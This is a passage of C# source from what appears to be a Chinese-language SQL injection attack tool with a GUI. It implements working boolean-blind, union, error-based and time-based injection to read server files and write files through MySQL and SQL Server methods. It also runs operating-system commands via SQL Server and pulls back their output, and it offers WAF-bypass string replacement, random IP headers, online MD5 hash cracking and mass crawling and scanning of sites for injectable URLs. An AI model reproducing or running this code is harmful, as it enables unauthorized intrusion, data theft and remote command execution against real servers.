                                Thread.Sleep(50);
                                if (MyThreadPool.getCurrentThreadCount() == 0)
                                {

                                    if (ver_tmp != null)
                                    {
                                        value = Tools.unHex(Tools.convertToString(ver_tmp), config.readFileEncoding);
                                        break;
                                    }

                                }

                            }
                            this.Invoke(new StringDelegate(file_txt_resultSetText), value);
                            this.Invoke(new StringDelegate(log), this.file_cbox_readWrite.Text + "完成！");

                        }
                        catch (Exception e)
                        {
                            this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
                        }
                        break;
                    case InjectType.Union:
                        try
                        {
                            if (config.columnsCount <= 0)
                            {
                                MessageBox.Show("大侠，请在注入中心，配置Union注入的列数！");
                                return;
                            }

                            String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", MySQL5.creatMySQLReadFileByUnion(config.columnsCount, config.showColumn, "convert(load_file(" + path_16 + ") using UTF8)")));
                            this.dataCount = result.Length;
                            this.currentDataCount = result.Length;
                            this.Invoke(new StringDelegate(file_txt_resultSetText), result);
                            this.Invoke(new StringDelegate(log), "报告大侠，获取到文件数据!");
                        }
                        catch (Exception e)
                        {
                            this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
                        }
                        break;
                    case InjectType.Error:
                        try
                        {
                            String payload_len = MySQL5.char_length.Replace("{data}", data_payload);
                            String payload_len_error = MySQL5.error_value.Replace("{data}", MySQL5.creatMySQLColumnStr(payload_len));

                            String result_length = getOneDataByUnionOrError(payload_len_error);


                            int sumlen = Tools.convertToInt(result_length);
                            this.dataCount = sumlen;
                            String result = "";

                            int start = 1;
                            //每次获取长度，err方式有长度限制
                            int count = 64 - 6;
                            this.Invoke(new StringDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！");
                            while (start < sumlen)
                            {
                                //hex编码，防止中文等乱码
                                String datas_value_tmp = MySQL5.creatMySQLColumnStr(MySQL5.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString()).Replace("{len}", count.ToString()));
                                String c_datas_value_payload = MySQL5.error_value.Replace("{data}", datas_value_tmp);
                                result += getOneDataByUnionOrError(c_datas_value_payload);
                                start += count;
                                this.currentDataCount = result.Length;
                                this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.unHex(result, config.readFileEncoding));
                            }
                            //查找格式^^^col$$$col^^^
                            result = Tools.unHex(result, config.readFileEncoding);
                            Match m = Regex.Match(result, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
                            if (m.Success)
                            {
                                result = m.Value;
                            }
                            this.Invoke(new StringDelegate(file_txt_resultSetText), result);
                            this.Invoke(new StringDelegate(log), "获取文件内容！");
                        }
                        catch (Exception e)
                        {

                            this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
                        }
                        break;

                }
            }
            else if (this.file_cbox_readWrite.SelectedIndex == 1)
            {
                //union方式写文件
                if (config.injectType.Equals(InjectType.Union))
                {
                    if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                    {
                        String payload = MySQL5.creatMySQLWriteFileByUnion(config.columnsCount, config.showColumn, path, this.file_txt_result.Text);
                        HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                        MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                    }
                    else
                    {
                        MessageBox.Show("请在下面输入您要写入文件的内容，请注意，GET方式的注入提交数据不能超过1024个字节！");
                    }
                }
                else
                {

                    MessageBox.Show("大侠此种方式写文件，只支持Union注入！");
                }
            }
            else if (this.file_cbox_readWrite.SelectedIndex == 2)
            {
                //filesystemobject写文件
                String payload = MSSQL.witeFileByFileSystemObject.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
            }
            else if (this.file_cbox_readWrite.SelectedIndex == 3)
            {
                //sp_makewebtask写文件
                String payload = MSSQL.witeFileBySP_MakeWebTask.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
            }
            else if (this.file_cbox_readWrite.SelectedIndex == 4)
            {
                //backup database写文件
                String payload = MSSQL.witeFileByBackDataBase.Replace("{path}", Tools.strToHex(path, "GB2312")).Replace("{data}", Tools.strToHex(this.file_txt_result.Text, "GB2312"));
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
            }
            else if (this.file_cbox_readWrite.SelectedIndex == 5)
            {
                //filesystemobject读文件
                String payload = MSSQL.readFileByFileSystemobject.Replace("{path}", path);
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                switch (config.injectType)
                {
                    case InjectType.Bool:

                        //取每一列的值
                        data_payload = MSSQL.file_content;
                        String payload_len = MSSQL.bool_dataLength.Replace("{data}", data_payload);
                        int len = getValue(payload_len, 0, 1024 * 100);
                        ver_tmp = new String[len];
                        this.dataCount = len;
                        this.Invoke(new StringDelegate(log), "SQLServer读到文件内容，长度为" + len + "字节！");
                        //获取值
                        for (int i = 1; i <= len; i++)
                        {
                            MyThreadPool.initThread(new ParameterizedThreadStart(getFileContentBySQLServer), i);
                            this.currentDataCount = i;
                        }
                        while (status == 1)
                        {
                            if (MyThreadPool.getCurrentThreadCount() <= 0)
                            {
                                this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.StringArrayToString(ver_tmp));
                                this.Invoke(new StringDelegate(log), "获取SQLServer读到文件内容完成！");
                                break;
                            }
                            Thread.Sleep(50);
                        }
                        break;

                    case InjectType.Union:

                        String unionresult = getOneDataByUnionOrError(MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.file_content));
                        this.Invoke(new StringDelegate(file_txt_resultSetText), unionresult);
                        this.Invoke(new StringDelegate(log), "获取到SQLServer读取的文件内容，长度为" + unionresult.Length + "字节！");
                        break;
                    case InjectType.Error:

                        String errorresult = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.file_content));
                        this.Invoke(new StringDelegate(file_txt_resultSetText), errorresult);
                        this.Invoke(new StringDelegate(log), "获取到SQLServer读取的文件内容，长度为" + errorresult.Length + "字节！");
                        break;
                    case InjectType.Sleep:
                        getDatasByUnion(config.dbType, null, 1, 1);
                        break;
                }
            }
            this.file_btn_start.Text = "开始";
            status = 0;

        }

        public void getFileContentBySQLServer(Object index)
        {
            try
            {
                //取值payload，替换对应下标值
                //select UNICODE(substring(@@version,{index},1))
                //取值payload，替换对应下标值
                String unicode_data_payload = MSSQL.unicode_value.Replace("{index}", index + "").Replace("{data}", MSSQL.file_content);
                //取unicode转换后的长度
                String unicode_data_len_payload = MSSQL.bool_length.Replace("{data}", unicode_data_payload);

                //长度范围2-8支持大部分语言
                int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                int m_index = 1;
                StringBuilder unicodes = new StringBuilder();

                String value = "";

                while (m_index <= unicode_data_len)
                {
                    //获取多字节
                    String substr_payload = MSSQL.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                    //单个unicode值范围是0-9
                    int unicode = getValue(MSSQL.bool_value.Replace("{data}", substr_payload), 0, 9);
                    unicodes.Append(unicode.ToString());
                    m_index++;
                }
                int rstr = int.Parse(unicodes.ToString());
                if (rstr <= 255)
                {
                    value += (char)rstr;
                }
                else
                {
                    value += Tools.unHexByUnicode(rstr, config.readFileEncoding);
                }
                ver_tmp[int.Parse(index.ToString()) - 1] = value;
                this.Invoke(new StringDelegate(file_txt_resultSetText), Tools.StringArrayToString(ver_tmp));
            }
            catch (Exception e)
            {

                Tools.SysLog("获取SQLServer读到的文件内容发生错误！" + e.Message);
            }
        }

        public void readOrWriteFileByMySQLByHexAscii(Object param)
        {
            String[] ps = param.ToString().Split('#');
            int index = int.Parse(ps[1].ToString());
            String tmp_va_payload = MySQL5.ver_value.Replace("{data}", ps[0]).Replace("{index}", (index + 1) + "");
            //数字加大写字母的ascii码
            int ascii = getValue(tmp_va_payload, 48, 90);
            ver_tmp[index] = ((char)ascii).ToString();
            String value = Tools.unHex(Tools.convertToString(ver_tmp), "GB2312");
            this.Invoke(new StringDelegate(file_txt_resultSetText), value);

        }

        public void execCMDBySQLServerByUnicode(Object param)
        {

            String[] ps = param.ToString().Split('#');
            int index = int.Parse(ps[1]);

            int len = getValue(MSSQL.bool_length.Replace("{data}", ps[0]), 0, 8);

            int cindex = 1;
            String temUnicode = "";
            while (cindex <= len)
            {
                String tmp_payload = MSSQL.bool_value.Replace("{data}", "convert(int," + MSSQL.substr.Replace("{data}", ps[0]).Replace("{index}", cindex + "") + ")");
                //数字加大写字母的ascii码
                int ascii = getValue(tmp_payload, 0, 9);
                temUnicode += ascii.ToString();
                cindex++;
            }
            int unicode = Tools.convertToInt(temUnicode);

            ver_tmp[index - 1] = Tools.unHexByUnicode(unicode, "UTF-8");
            this.Invoke(new StringDelegate(log), "获取到CMD执行结果--" + ver_tmp[index - 1]);
        }

        public void execCMDBySQLServer()
        {
            try
            {
                if (Thread.CurrentThread.Name == null)
                {
                    Thread.CurrentThread.Name = "CmdThread-";
                }

                String cmd = this.cmd_txt_cmd.Text;
                String cmd_16 = Tools.strToHex(cmd, "GB2312");
                //执行cmd
                String cmd_data_payload = MSSQL.createTable.Replace("{cmd}", cmd_16);
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cmd_data_payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                this.Invoke(new StringDelegate(log), "报告大侠，CMD命令执行完成，正在等待获取执行结果！");
                if (config.showCmdResult)
                {
                    switch (config.injectType)
                    {

                        case InjectType.Bool:
                            try
                            {
                                if (String.IsNullOrEmpty(config.key))
                                {

                                    MessageBox.Show("大侠，请在注入中心，配置Bool盲注的关键字！");
                                    return;
                                }
                                String count_payload = MSSQL.bool_value.Replace("{data}", MSSQL.cmdDataCount);
                                int count = getValueByStepUp(count_payload, 0, 50);
                                for (int i = 1; i <= count; i++)
                                {
                                    String data_payload = MSSQL.cmdData.Replace("{index}", i + "");
                                    String payload_len = MSSQL.bool_length.Replace("{data}", data_payload);
                                    int len = getValueByStepUp(payload_len, 0, 100);
                                    this.dataCount = len;
                                    ver_tmp = new String[len];
                                    //获取值
                                    for (int j = 1; j <= len; j++)
                                    {
                                        String dtmp_payload = MSSQL.unicode_value.Replace("{data}", data_payload).Replace("{index}", j + "");
                                        MyThreadPool.initThread(new ParameterizedThreadStart(execCMDBySQLServerByUnicode), dtmp_payload + "#" + j);
                                        this.currentDataCount = j;
                                    }
                                    while (status == 1)
                                    {

                                        Thread.Sleep(50);
                                        if (MyThreadPool.getCurrentThreadCount() == 0)
                                        {
                                            if (ver_tmp != null)
                                            {
                                                break;
                                            }
                                        }
                                    }
                                    this.dataCount = len;
                                    this.cmd_txt_result.AppendText(HttpUtility.HtmlDecode(Tools.StringArrayToString(ver_tmp)) + "\r\n");
                                    this.Invoke(new StringDelegate(log), "报告大侠，获取到执行CMD命令第" + i + "行数据！");
                                }
                                this.Invoke(new StringDelegate(log), "报告大侠，获取CMD执行结果完成！");
                            }
                            catch (Exception e)
                            {
                                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
                            }
                            break;
                        case InjectType.Union:
                            try
                            {
                                //检查配置
                                if (config.columnsCount <= 0)
                                {

                                    MessageBox.Show("大侠，请在注入中心，配置Union注入的列数！");
                                    return;
                                }

                                String data_count = getOneDataByUnionOrError(MSSQL.getUnionDataValueByCMD(config.columnsCount, config.showColumn, MSSQL.cmdDataCount));

                                this.Invoke(new StringDelegate(log), "报告大侠，CMD执行后CMD表有" + Tools.convertToInt(data_count) + "行数据，请稍候，正在获取...");

                                int count = Tools.convertToInt(data_count);
                                this.dataCount = count;
                                //下标从1开始
                                for (int i = 1; i <= count; i++)
                                {
                                    String payload = MSSQL.cmdData.Replace("{index}", i.ToString());
                                    String result = getOneDataByUnionOrError(MSSQL.getUnionDataValueByCMD(config.columnsCount, config.showColumn, payload));
                                    this.cmd_txt_result.AppendText(HttpUtility.HtmlDecode(result) + "\r\n");
                                    this.Invoke(new StringDelegate(log), "报告大侠，获取到执行CMD命令第" + i + "行数据！");
                                    this.currentDataCount = i;
                                }
                                this.Invoke(new StringDelegate(log), "报告大侠，获取CMD执行结果完成！");


                            }
                            catch (Exception e)
                            {
                                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
                            }
                            break;
                        case InjectType.Error:
                            try
                            {

                                String payload_len = MSSQL.bool_length.Replace("{data}", MSSQL.cmdData);
                                String data_count = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.cmdDataCount));

                                this.Invoke(new StringDelegate(log), "报告大侠，正在获取CMD命令执行结果！");
                                int count = Tools.convertToInt(data_count);
                                this.dataCount = count;
                                //下标从1开始
                                for (int i = 1; i <= count; i++)
                                {
                                    String payload = MSSQL.cmdData.Replace("{index}", i.ToString());
                                    String result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", payload));
                                    this.cmd_txt_result.AppendText(HttpUtility.HtmlDecode(result) + "\r\n");
                                    this.Invoke(new StringDelegate(log), "报告大侠，获取到执行CMD命令第" + i + "行数据！");
                                    this.currentDataCount = i;
                                }
                                this.Invoke(new StringDelegate(log), "报告大侠，获取CMD执行结果完成！");

                            }
                            catch (Exception e)
                            {

                                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
                            }
                            break;
                    }
                }
                //删除表
                HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, MSSQL.dropTable, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                this.Invoke(new StringDelegate(log), "清除执行命令时创建的临时表完成！");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "执行命令获取结果发生异常：" + e.Message);
            }
            this.cmd_btn_start.Text = "开始";
            status = 0;
        }


        private void file_btn_start_Click(object sender, EventArgs e)
        {
            if (status == 0)
            {
                if (config.dbType.Equals(DBType.MySQL5) || config.dbType.Equals(DBType.SQLServer))
                {
                    if (String.IsNullOrEmpty(this.file_txt_filePath.Text))
                    {

                        MessageBox.Show("请填写读写文件的磁盘路径！");
                        return;
                    }
                    if (MyThreadPool.getCurrentThreadCount() > 0)
                    {
                        MessageBox.Show("请稍候还有后台线程正在运行！");
                        return;
                    }
                    if (!checkConfig())
                    {
                        return;
                    }
                    if (!isSetInjectPoint())
                    {
                        return;
                    }
                    status = 1;
                    this.file_btn_start.Text = "停止";
                    this.currentThread = new Thread(readOrWriteFile);
                    this.currentThread.Start();
                }
                else
                {
                    MessageBox.Show("抱歉，文件读写目前只支持MySQL和SQLServer，并且账户拥有文件读写权限！");
                }
            }
            else
            {

                StopThread();
                this.file_btn_start.Text = "开始";
            }

        }

        private void cmd_btn_start_Click(object sender, EventArgs e)
        {
            if (status == 0)
            {
                if (config.dbType.Equals(DBType.SQLServer))
                {
                    if (String.IsNullOrEmpty(this.cmd_txt_cmd.Text))
                    {

                        MessageBox.Show("请输入执行的命令！");
                        return;
                    }
                    if (MyThreadPool.getCurrentThreadCount() > 0)
                    {
                        MessageBox.Show("请稍候还有后台线程正在运行！");
                        return;
                    }

                    status = 1;
                    this.cmd_btn_start.Text = "结束";
                    this.cmd_txt_result.Clear();
                    this.currentThread = new Thread(execCMDBySQLServer);
                    this.currentThread.Start();
                }
                else
                {
                    MessageBox.Show("抱歉，此功能目前只支持SQLServer数据库，并且账户拥有dba权限！");
                }
            }
            else
            {
                StopThread();
                this.cmd_btn_start.Text = "开始";
            }
        }

        private void cmd_chk_showCmdResult_CheckedChanged(object sender, EventArgs e)
        {
            config.showCmdResult = this.cmd_chk_showCmdResult.Checked;
        }

        private void file_txt_result_TextChanged(object sender, EventArgs e)
        {
            this.file_txt_result.SelectionStart = this.file_txt_result.Text.Length;
            this.file_txt_result.SelectionLength = 0;
            this.file_txt_result.ScrollToCaret();
        }

        private void cmd_txt_result_TextChanged(object sender, EventArgs e)
        {
            this.file_txt_result.SelectionStart = this.file_txt_result.Text.Length;
            this.file_txt_result.SelectionLength = 0;
            this.file_txt_result.ScrollToCaret();
        }

        private void bypass_btn_addReplaceStr_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(this.bypass_txt_replace.Text))
            {

                MessageBox.Show("大侠，请输入需要替换的字符！");
                return;
            }
           
            if (this.bypass_txt_replace.Text.Equals(this.bypass_txt_replaceTo.Text))
            {

                MessageBox.Show("大侠，两个字符一样的，还需要替换什么，你这是在忽悠我吗！");
                return;
            }

            if (!replaceList.ContainsKey(this.bypass_txt_replace.Text))
            {
                ListViewItem lvi = new ListViewItem(this.bypass_txt_replace.Text);
                lvi.SubItems.Add(this.bypass_txt_replaceTo.Text);
                lvi.Name = this.bypass_txt_replaceTo.Text;
                this.bypass_lvw_replaceString.Items.Add(lvi);

                replaceList.Add(this.bypass_txt_replace.Text, this.bypass_txt_replaceTo.Text);
                config.replaceStrs += (this.bypass_txt_replace.Text + "\t" + this.bypass_txt_replaceTo.Text + "\n");
            }
            else
            {
                MessageBox.Show("大侠，替换字符" + this.bypass_txt_replace.Text + "已经在列表了！");
            }




        }

        private void bypass_chk_inculdeStr_CheckedChanged(object sender, EventArgs e)
        {
            config.inculdeStr = this.bypass_chk_inculdeStr.Checked;
        }

        private void bypass_delselect_Click(object sender, EventArgs e)
        {
            if (this.bypass_lvw_replaceString.SelectedItems != null && this.bypass_lvw_replaceString.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvi in this.bypass_lvw_replaceString.SelectedItems)
                {

                    this.bypass_lvw_replaceString.Items.Remove(lvi);
                    String delStr = lvi.SubItems[0].Text + "\t" + lvi.SubItems[1].Text + "\n";
                    config.replaceStrs = config.replaceStrs.Replace(delStr, "");
                    replaceList.Remove(lvi.SubItems[0].Text);

                }
            }
            else
            {
                MessageBox.Show("没有选择！");
            }
        }

        private void file_cbox_readWrite_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if ("加载获取IIS虚拟网站信息VBS".Equals(this.file_cbox_readWrite.Text))
                {

                    //加载vbs脚本
                    this.file_txt_filePath.Text = "c:/test.vbs";
                    this.file_txt_result.Text = FileTool.readFileToString("config/GetIISWebInfo.vbs");
                    MessageBox.Show("加载成功，大侠，请选择对应的写文件方法写入VBS！");
                }
            }
            catch (Exception ee)
            {
                Tools.SysLog("读取config/GetIISWebInfo.vbs发生错误！异常信息：" + ee.Message);
                MessageBox.Show("加载config/GetIISWebInfo.vbs发生错误！");
            }
        }
        //验证key是否正确
        private void injectConfig_btn_checkKey_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(checkTheKey);
            this.injectConfig_btn_checkKey.Enabled = false;
            t.Start();
        }

        public void checkTheKey()
        {

            if (checkConfig())
            {
                if (isSetInjectPoint())
                {

                    bool truep = findKeyInBody(Comm.truePayload);
                    bool falsep = findKeyInBody(Comm.falsePayload);
                    if (truep == true && falsep == false)
                    {
                        MessageBox.Show("关键字设置正确！");
                    }
                    else
                    {

                        MessageBox.Show("此关键字设置错误，无法通过此关键字获取数据！请查看HTTP发包记录是否存在乱码，检查编码设置是否正确；可能此关键字同时在真假条件上出现，请更换关键字！");
                    }
                }
            }
            this.injectConfig_btn_checkKey.Enabled = true;
        }

        private void bypass_cbox_sendHTTPSleepTime_TextChanged(object sender, EventArgs e)
        {
            config.sendHTTPSleepTime = Tools.convertToInt(this.bypass_cbox_sendHTTPSleepTime.Text);
        }

        private void bypass_cbox_randIPToHeader_TextChanged(object sender, EventArgs e)
        {
            config.randIPToHeader = this.bypass_cbox_randIPToHeader.Text;
        }

        private void encode_cbox_encode_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                String encode = this.encode_txt_input.Text;
                if (this.encode_cbox_encode.SelectedIndex != 0)
                {

                    if (String.IsNullOrEmpty(encode))
                    {
                        MessageBox.Show("请输入要编码的字符！");
                        this.encode_txt_input.Focus();
                    }
                }

                switch (this.encode_cbox_encode.SelectedIndex)
                {
                    case 1:
                        this.encode_txt_result.Text = System.Web.HttpUtility.UrlEncode(encode);
                        break;
                    case 2:
                        this.encode_txt_result.Text = Convert.ToBase64String(Encoding.UTF8.GetBytes(encode));
                        break;
                    case 3:
                        this.encode_txt_result.Text = Tools.stringToAscii(encode);
                        break;
                    case 4:
                        this.encode_txt_result.Text = Tools.strToHex(encode, "UTF-8");
                        break;
                    case 5:
                        md5();
                        break;

                }
            }
            catch (Exception ep)
            {

                log("编码发生异常！" + ep.Message);

            }
        }

        private void encode_cbox_decode_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                String decode = this.encode_txt_input.Text;
                if (this.encode_cbox_decode.SelectedIndex != 0)
                {

                    if (String.IsNullOrEmpty(decode))
                    {
                        MessageBox.Show("请输入要解码的字符！");
                        this.encode_txt_result.Focus();
                    }
                }

                switch (this.encode_cbox_decode.SelectedIndex)
                {
                    case 1:
                        this.encode_txt_result.Text = System.Web.HttpUtility.UrlDecode(decode);
                        break;
                    case 2:
                        this.encode_txt_result.Text = Encoding.UTF8.GetString(Convert.FromBase64String(decode));
                        break;
                    case 3:
                        MessageBox.Show("多个ascii需使用空格隔开！");
                        this.encode_txt_result.Text = Tools.asciiToString(decode);
                        break;
                    case 4:
                        this.encode_txt_result.Text = Tools.unHex(decode, "UTF-8");
                        break;
                    case 5:
                        log("----------------正在进行在线MD5解密----------------");
                        log("----------------正在查找www.cmd5.com---------------");
                        this.encode_txt_result.Text = "";
                        this.encode_txt_result.Text += "www.cmd5.com查询结果：" + OnlineMD5.decodeMD5_cmd5(this.encode_txt_input.Text) + "\r\n";
                        log("----------------正在查找www.md5.com.cn--------------");
                        this.encode_txt_result.Text += "www.md5.com.cn查询结果：" + OnlineMD5.decodeMD5_md5_com_cn(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.xmd5.org----------------");
                        this.encode_txt_result.Text += "www.xmd5.org查询结果：" + OnlineMD5.decodeMD5_xmd5_org(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.somd5.com---------------");
                        this.encode_txt_result.Text += "www.somd5.com查询结果：" + OnlineMD5.decodeMD5_somd5_com(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.md5.cc------------------");
                        this.encode_txt_result.Text += "www.md5.cc查询结果：" + OnlineMD5.decodeMD5_md5_cc(this.encode_txt_input.Text) + "\r\n";
                        log("---------------正在查找www.pmd5.com------------------");
                        this.encode_txt_result.Text += "www.pmd5.cm查询结果：" + OnlineMD5.decodeMD5_pmd5_com(this.encode_txt_input.Text);
                        break;

                }
            }
            catch (Exception ep)
            {

                log("解码发生异常！" + ep.Message);
            }
        }
        public void checkTheKey(ServerInfo trueServer, ServerInfo falseServer, ServerInfo oldServer)
        {

            //判断关键字,body中的词
            String key = Tools.findKeyByStr(trueServer.body, falseServer.body, oldServer.body);
            this.chk_inject_reverseKey.Checked = false;
            //如果为空反过来查找
            if (String.IsNullOrEmpty(key))
            {
                this.Invoke(new StringDelegate(log), "Body响应内容中正向查找未发现盲注关键字！");
                this.chk_inject_reverseKey.Checked = true;
                key = Tools.findKeyByStr(falseServer.body, trueServer.body, oldServer.body);
                if (String.IsNullOrEmpty(key))
                {
                    this.Invoke(new StringDelegate(log), "Body响应内容中反向查找未发现盲注关键字！");
                    this.chk_inject_reverseKey.Checked = false;
                }
            }
            if (!String.IsNullOrEmpty(key))
            {
                this.cbox_inject_type.SelectedIndex = 0;
                this.txt_inject_key.Text = key;
                this.Invoke(new StringDelegate(log), "发现盲注关键字！" + key);
                return;
            }

            //状态码判断
            int code = Tools.findKeyByCode(trueServer.code, falseServer.code);
            if (code == 0)
            {
                this.Invoke(new StringDelegate(log), "响应状态码不能作为盲注判断条件！");

            }
            else
            {
                this.cbox_inject_type.SelectedIndex = 1;
                this.txt_inject_key.Text = key;
                this.Invoke(new StringDelegate(log), "响应状态码可以作为盲注判断条件！");
                return;
            }

            //时间判断

            if (trueServer.runTime < config.maxTime && falseServer.runTime < config.maxTime)
            {
                this.cbox_inject_type.SelectedIndex = 2;
                this.txt_inject_key.Text = config.maxTime.ToString();
                this.Invoke(new StringDelegate(log), "逻辑为真的响应时间可以作为盲注判断条件！");
                return;
            }
            if (falseServer.runTime < config.maxTime && trueServer.runTime < config.maxTime)
            {
                this.cbox_inject_type.SelectedIndex = 2;
                this.txt_inject_key.Text = config.maxTime.ToString();
                this.chk_inject_reverseKey.Checked = true;
                this.Invoke(new StringDelegate(log), "逻辑为假的响应时间可以作为盲注判断条件！");
                return;
            }
            this.Invoke(new StringDelegate(log), "没有发现盲注判断条件，请检查注入标记、编码等基础配置是否正确！");
        }

        private void inject_btn_autoFindKey_Click(object sender, EventArgs e)
        {
            try
            {
                if (config.request.IndexOf(setInjectStr) == -1)
                {

                    MessageBox.Show("大侠，请标记注入后，程序才能自动查找关键字！");
                    return;
                }
                if (config.request.IndexOf("<sEncode>") == -1)
                {

                    MessageBox.Show("大侠，请将注入标记范围内参数标记编码，程序才能对标记编码范围内的数据进行URL编码，否则有错误！");
                    return;
                }
                this.inject_btn_autoFindKey.Enabled = false;
                ServerInfo trueServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, Comm.truePayload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                ServerInfo falseServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, Comm.falsePayload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                checkTheKey(trueServer, falseServer, trueServer);
                this.Invoke(new StringDelegate(log), "自动查找关键字完成！");

            }
            catch (Exception ep)
            {
                this.Invoke(new StringDelegate(log), "自动查找关键字发生异常！" + ep.Message);
            }
            this.inject_btn_autoFindKey.Enabled = true;
        }

        private void scanInjection_importDomains_Click(object sender, EventArgs e)
        {
            if (addStatus == 0) {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
                if (ofd.ShowDialog() == DialogResult.OK )
                {
                    this.scan_list.Clear();
                    this.scanInjection_txt_domainsPath.Text = ofd.FileName;
                    addStatus = 1;
                    Thread th = new Thread(new ParameterizedThreadStart(addItemToScanDomain));
                    th.Start(ofd.FileName); 
                }
            }
            else {
                MessageBox.Show("加载任务未完成。");
            } 
        }
        public int addStatus = 0;
        public void addItemToScanDomain(Object path) {
            this.scan_list = FileTool.readDomainToList(path.ToString(), true);
            this.scanInjection_domainsCount.Text = this.scan_list.Count + "";
            int i = 0;
            comm_count = this.scan_list.Count;
            foreach (String url in this.scan_list)
            {
                this.scanInject_lsb_links.Items.Add(url);
                i++;
                comm_currentCount = i;
            }
            addStatus = 0;
            MessageBox.Show("加载列表完成！");
        }

        Thread scanedThread = null;


        public void stopScan()
        {
            Main.status = -1;
            this.scanInjection_btn_scan.Enabled = false;
            this.scanInjection_btn_scan.Text = "正在停止";
            while (MyThreadPool.getCurrentThreadCount() > 0)
            {

                Thread.Sleep(100);
            }
            this.scanInjection_btn_scan.Text = "开始扫描";
            this.scanInjection_btn_scan.Enabled = true;
            Main.status = 0;
            Thread.CurrentThread.Abort();
        }

        public void stopSpider()
        {
            Main.status = -1;
            this.scanInjection_btn_spider.Enabled = false;
            this.scanInjection_btn_spider.Text = "正在停止";
            while (MyThreadPool.getCurrentThreadCount() > 0)
            {

                Thread.Sleep(100);
            }
            this.scanInjection_btn_spider.Text = "爬行链接";
            this.scanInjection_domainsCount.Text = this.scanInject_lsb_links.Items.Count.ToString();
            this.scanInjection_btn_spider.Enabled = true;
            Main.status = 0;
            Thread.CurrentThread.Abort();
        }
        public void spider()
        {
            foreach (String url in scan_list)
            {
                //爬行
                MyThreadPool.initThread(new ParameterizedThreadStart(spiderURLs), url, url + "----" + scanedDomain);
                scanedDomain++;
            }
            stopSpider();
        }
        public void scan()
        {
            //扫描
            HashSet<String> testURL = new HashSet<String>();
            foreach (String url in this.scanInject_lsb_links.Items)
            {
                if (url.IndexOf("?") != -1)
                {
                    if (!testURL.Contains(url))
                    {
                        testURL.Add(url);
                        MyThreadPool.initThread(new ParameterizedThreadStart(scanInject), url);
                        scanedURLSCount++;
                    }
                    else {
                        this.Invoke(new StringDelegate(log), url+"----此URL以检测过了，自动跳过！");
                    }
                }
            }
            stopScan();
        }
        public int urlSumCount = 0;//待扫url
        public int scanedURLSCount = 0;//已扫

        public String GetOneURL(List<String> mylist, int index) {
            try
            {
                if (!String.IsNullOrEmpty(mylist[index]))
                {
                    return mylist[index];
                }
            }
            catch (Exception e) {

            }
            
            return "";
        }

        public void spiderURLs(object url)
        {
            try
            {
                Spider.config = config;
                Spider sp = new Spider();
                if (this.scanInect_chk_isSpider.Checked)
                {
                    sp.findLinks(url.ToString());
                }
                else
                {
                    sp.AllURL.Add(url.ToString());
                }
                int count = 0;
                int s = sp.AllURL.Count;//第一次URL总数
                int spindex = 0;//爬行下标
                int index = 0;
